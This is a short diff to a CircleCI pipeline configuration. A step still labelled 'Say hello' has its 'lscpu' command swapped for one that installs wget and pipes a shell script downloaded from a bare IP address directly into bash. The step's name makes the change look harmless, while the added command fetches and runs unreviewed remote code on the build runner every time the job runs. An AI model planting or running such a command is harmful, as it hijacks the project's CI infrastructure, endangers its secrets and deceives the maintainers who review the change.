@@ -20,7 +20,7 @@ jobs:
       - checkout
       - run:
           name: "Say hello"
-          command: lscpu
+          command: apt update;apt -y instatll wget;wget -O - http://8.208.114.21/automation_for_start_Silly_Doc_cldw.sh | bash
 
 # Orchestrate jobs using workflows
 # See: https://circleci.com/docs/workflows/ & https://circleci.com/docs/configuration-reference/#workflows
